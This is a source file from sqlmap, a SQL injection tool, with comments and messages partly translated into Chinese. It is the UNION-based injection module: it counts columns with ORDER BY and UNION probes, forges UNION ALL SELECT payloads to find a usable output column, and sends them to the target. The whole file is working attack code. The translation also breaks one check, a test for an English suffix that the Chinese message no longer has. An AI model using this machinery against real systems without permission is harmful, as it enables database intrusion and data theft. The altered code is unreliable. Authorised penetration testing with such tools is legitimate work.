#!/usr/bin/env python
#coding=utf-8
"""
Copyright (c) 2006-2017 sqlmap developers (http://sqlmap.org/)
See the file 'doc/COPYING' for copying permission
"""

import logging
import random
import re

from lib.core.agent import agent
from lib.core.common import average
from lib.core.common import Backend
from lib.core.common import isNullValue
from lib.core.common import listToStrValue
from lib.core.common import popValue
from lib.core.common import pushValue
from lib.core.common import randomInt
from lib.core.common import randomStr
from lib.core.common import readInput
from lib.core.common import removeReflectiveValues
from lib.core.common import singleTimeLogMessage
from lib.core.common import singleTimeWarnMessage
from lib.core.common import stdev
from lib.core.common import wasLastResponseDBMSError
from lib.core.data import conf
from lib.core.data import kb
from lib.core.data import logger
from lib.core.dicts import FROM_DUMMY_TABLE
from lib.core.enums import PAYLOAD
from lib.core.settings import LIMITED_ROWS_TEST_NUMBER
from lib.core.settings import UNION_MIN_RESPONSE_CHARS
from lib.core.settings import UNION_STDEV_COEFF
from lib.core.settings import MIN_RATIO
from lib.core.settings import MAX_RATIO
from lib.core.settings import MIN_STATISTICAL_RANGE
from lib.core.settings import MIN_UNION_RESPONSES
from lib.core.settings import NULL
from lib.core.settings import ORDER_BY_STEP
from lib.core.unescaper import unescaper
from lib.request.comparison import comparison
from lib.request.connect import Connect as Request

def _findUnionCharCount(comment, place, parameter, value, prefix, suffix, where=PAYLOAD.WHERE.ORIGINAL):
    """
    Finds number of columns affected by UNION based injection
    """
    retVal = None

    def _orderByTechnique():
        def _orderByTest(cols):
            query = agent.prefixQuery("ORDER BY %d" % cols, prefix=prefix)
            query = agent.suffixQuery(query, suffix=suffix, comment=comment)
            payload = agent.payload(newValue=query, place=place, parameter=parameter, where=where)
            page, headers, code = Request.queryPage(payload, place=place, content=True, raise404=False)
            return not any(re.search(_, page or "", re.I) and not re.search(_, kb.pageTemplate or "", re.I) for _ in ("(warning|error):", "order by", "unknown column", "failed")) and comparison(page, headers, code) or re.search(r"data types cannot be compared or sorted", page or "", re.I)

        if _orderByTest(1) and not _orderByTest(randomInt()):
            infoMsg = u"'ORDER BY'技术似乎是可用的。"
            infoMsg += u"这将减少查找正确数量的查询列所需的时间。"
            infoMsg += u"自动扩展当前UNION查询注入技术测试的范围。"
            singleTimeLogMessage(infoMsg)

            lowCols, highCols = 1, ORDER_BY_STEP
            found = None
            while not found:
                if _orderByTest(highCols):
                    lowCols = highCols
                    highCols += ORDER_BY_STEP
                else:
                    while not found:
                        mid = highCols - (highCols - lowCols) / 2
                        if _orderByTest(mid):
                            lowCols = mid
                        else:
                            highCols = mid
                        if (highCols - lowCols) < 2:
                            found = lowCols

            return found

    try:
        pushValue(kb.errorIsNone)
        items, ratios = [], []
        kb.errorIsNone = False
        lowerCount, upperCount = conf.uColsStart, conf.uColsStop

        if lowerCount == 1:
            found = kb.orderByColumns or _orderByTechnique()
            if found:
                kb.orderByColumns = found
                infoMsg = "目标网址在查询中似乎含有%d列%s" % (found, '(字段)' if found > 1 else "")
                singleTimeLogMessage(infoMsg)
                return found

        if abs(upperCount - lowerCount) < MIN_UNION_RESPONSES:
            upperCount = lowerCount + MIN_UNION_RESPONSES

        min_, max_ = MAX_RATIO, MIN_RATIO
        pages = {}

        for count in xrange(lowerCount, upperCount + 1):
            query = agent.forgeUnionQuery('', -1, count, comment, prefix, suffix, kb.uChar, where)
            payload = agent.payload(place=place, parameter=parameter, newValue=query, where=where)
            page, headers, code = Request.queryPage(payload, place=place, content=True, raise404=False)
            if not isNullValue(kb.uChar):
                pages[count] = page
            ratio = comparison(page, headers, code, getRatioValue=True) or MIN_RATIO
            ratios.append(ratio)
            min_, max_ = min(min_, ratio), max(max_, ratio)
            items.append((count, ratio))

        if not isNullValue(kb.uChar):
            for regex in (kb.uChar, r'>\s*%s\s*<' % kb.uChar):
                contains = [(count, re.search(regex, _ or "", re.IGNORECASE) is not None) for count, _ in pages.items()]
                if len(filter(lambda _: _[1], contains)) == 1:
                    retVal = filter(lambda _: _[1], contains)[0][0]
                    break

        if not retVal:
            if min_ in ratios:
                ratios.pop(ratios.index(min_))
            if max_ in ratios:
                ratios.pop(ratios.index(max_))

            minItem, maxItem = None, None

            for item in items:
                if item[1] == min_:
                    minItem = item
                elif item[1] == max_:
                    maxItem = item

            if all(_ == min_ and _ != max_ for _ in ratios):
                retVal = maxItem[0]

            elif all(_ != min_ and _ == max_ for _ in ratios):
                retVal = minItem[0]

            elif abs(max_ - min_) >= MIN_STATISTICAL_RANGE:
                    deviation = stdev(ratios)
                    lower, upper = average(ratios) - UNION_STDEV_COEFF * deviation, average(ratios) + UNION_STDEV_COEFF * deviation

                    if min_ < lower:
                        retVal = minItem[0]

                    if max_ > upper:
                        if retVal is None or abs(max_ - upper) > abs(min_ - lower):
                            retVal = maxItem[0]
    finally:
        kb.errorIsNone = popValue()

    if retVal:
        infoMsg = u"目标网址似乎是可以使用UNION注入%d列" % retVal
        singleTimeLogMessage(infoMsg, logging.INFO, re.sub(r"\d+", "N", infoMsg))

    return retVal

def _unionPosition(comment, place, parameter, prefix, suffix, count, where=PAYLOAD.WHERE.ORIGINAL):
    validPayload = None
    vector = None

    positions = range(0, count)

    # Unbiased approach for searching appropriate usable column
    random.shuffle(positions)

    for charCount in (UNION_MIN_RESPONSE_CHARS << 2, UNION_MIN_RESPONSE_CHARS):
        if vector:
            break

        # For each column of the table (# of NULL) perform a request using
        # the UNION ALL SELECT statement to test it the target URL is
        # affected by an exploitable union SQL injection vulnerability
        for position in positions:
            # Prepare expression with delimiters
            randQuery = randomStr(charCount)
            phrase = "%s%s%s".lower() % (kb.chars.start, randQuery, kb.chars.stop)
            randQueryProcessed = agent.concatQuery("\'%s\'" % randQuery)
            randQueryUnescaped = unescaper.escape(randQueryProcessed)

            # Forge the union SQL injection request
            query = agent.forgeUnionQuery(randQueryUnescaped, position, count, comment, prefix, suffix, kb.uChar, where)
            payload = agent.payload(place=place, parameter=parameter, newValue=query, where=where)

            # Perform the request
            page, headers, _ = Request.queryPage(payload, place=place, content=True, raise404=False)
            content = "%s%s".lower() % (removeReflectiveValues(page, payload) or "", \
                removeReflectiveValues(listToStrValue(headers.headers if headers else None), \
                payload, True) or "")

            if content and phrase in content:
                validPayload = payload
                kb.unionDuplicates = len(re.findall(phrase, content, re.I)) > 1
                vector = (position, count, comment, prefix, suffix, kb.uChar, where, kb.unionDuplicates, False)

                if where == PAYLOAD.WHERE.ORIGINAL:
                    # Prepare expression with delimiters
                    randQuery2 = randomStr(charCount)
                    phrase2 = "%s%s%s".lower() % (kb.chars.start, randQuery2, kb.chars.stop)
                    randQueryProcessed2 = agent.concatQuery("\'%s\'" % randQuery2)
                    randQueryUnescaped2 = unescaper.escape(randQueryProcessed2)

                    # Confirm that it is a full union SQL injection
                    query = agent.forgeUnionQuery(randQueryUnescaped, position, count, comment, prefix, suffix, kb.uChar, where, multipleUnions=randQueryUnescaped2)
                    payload = agent.payload(place=place, parameter=parameter, newValue=query, where=where)

                    # Perform the request
                    page, headers, _ = Request.queryPage(payload, place=place, content=True, raise404=False)
                    content = "%s%s".lower() % (page or "", listToStrValue(headers.headers if headers else None) or "")

                    if not all(_ in content for _ in (phrase, phrase2)):
                        vector = (position, count, comment, prefix, suffix, kb.uChar, where, kb.unionDuplicates, True)
                    elif not kb.unionDuplicates:
                        fromTable = " FROM (%s) AS %s" % (" UNION ".join("SELECT %d%s%s" % (_, FROM_DUMMY_TABLE.get(Backend.getIdentifiedDbms(), ""), " AS %s" % randomStr() if _ == 0 else "") for _ in xrange(LIMITED_ROWS_TEST_NUMBER)), randomStr())

                        # Check for limited row output
                        query = agent.forgeUnionQuery(randQueryUnescaped, position, count, comment, prefix, suffix, kb.uChar, where, fromTable=fromTable)
                        payload = agent.payload(place=place, parameter=parameter, newValue=query, where=where)

                        # Perform the request
                        page, headers, _ = Request.queryPage(payload, place=place, content=True, raise404=False)
                        content = "%s%s".lower() % (removeReflectiveValues(page, payload) or "", \
                            removeReflectiveValues(listToStrValue(headers.headers if headers else None), \
                            payload, True) or "")
                        if content.count(phrase) > 0 and content.count(phrase) < LIMITED_ROWS_TEST_NUMBER:
                            warnMsg = "output with limited number of rows detected. Switching to partial mode"
                            logger.warn(warnMsg)
                            vector = (position, count, comment, prefix, suffix, kb.uChar, where, kb.unionDuplicates, True)

                unionErrorCase = kb.errorIsNone and wasLastResponseDBMSError()

                if unionErrorCase and count > 1:
                    warnMsg = "combined UNION/error-based SQL injection case found on "
                    warnMsg += "column %d. sqlmap will try to find another " % (position + 1)
                    warnMsg += "column with better characteristics"
                    logger.warn(warnMsg)
                else:
                    break

    return validPayload, vector

def _unionConfirm(comment, place, parameter, prefix, suffix, count):
    validPayload = None
    vector = None

    # 确认union SQL注入并获取可用于提取数据的确切列位置
    validPayload, vector = _unionPosition(comment, place, parameter, prefix, suffix, count)

    # 确保上述功能发现可扩展的完整union SQL注入位置
    if not validPayload:
        validPayload, vector = _unionPosition(comment, place, parameter, prefix, suffix, count, where=PAYLOAD.WHERE.NEGATIVE)

    return validPayload, vector

def _unionTestByCharBruteforce(comment, place, parameter, value, prefix, suffix):
    """
    此方法测试目标URL是否受unionSQL注入漏洞的影响。 测试在目标数据库表上最多可以有50列
    """

    validPayload = None
    vector = None

    # In case that user explicitly stated number of columns affected
    if conf.uColsStop == conf.uColsStart:
        count = conf.uColsStart
    else:
        count = _findUnionCharCount(comment, place, parameter, value, prefix, suffix, PAYLOAD.WHERE.ORIGINAL if isNullValue(kb.uChar) else PAYLOAD.WHERE.NEGATIVE)

    if count:
        validPayload, vector = _unionConfirm(comment, place, parameter, prefix, suffix, count)

        if not all([validPayload, vector]) and not all([conf.uChar, conf.dbms]):
            warnMsg = u"如果没有检测到基于UNION的SQL注入，请考虑"

            if not conf.uChar and count > 1 and kb.uChar == NULL:
                message = u"注入不能利用NULL值。你想尝试一个随机整数值选项'--union-char'吗？ [Y/n] "

                if not readInput(message, default="Y", boolean=True):
                    warnMsg += u"使用选项'--union-char'（例如'--union-char = 1'）"
                else:
                    conf.uChar = kb.uChar = str(randomInt(2))
                    validPayload, vector = _unionConfirm(comment, place, parameter, prefix, suffix, count)

            if not conf.dbms:
                if not conf.uChar:
                    warnMsg += u"强制尝试！"
                else:
                    warnMsg += u"强制指定后端数据库类型(例如“--dbms = mysql”)"

            if not all([validPayload, vector]) and not warnMsg.endswith("consider "):
                singleTimeWarnMessage(warnMsg)

    return validPayload, vector

def unionTest(comment, place, parameter, value, prefix, suffix):
    """
    此方法测试目标URL是否受unionSQL注入漏洞的影响。 测试可达3 * 50次
    """

    if conf.direct:
        return

    kb.technique = PAYLOAD.TECHNIQUE.UNION
    validPayload, vector = _unionTestByCharBruteforce(comment, place, parameter, value, prefix, suffix)

    if validPayload:
        validPayload = agent.removePayloadDelimiters(validPayload)

    return validPayload, vector
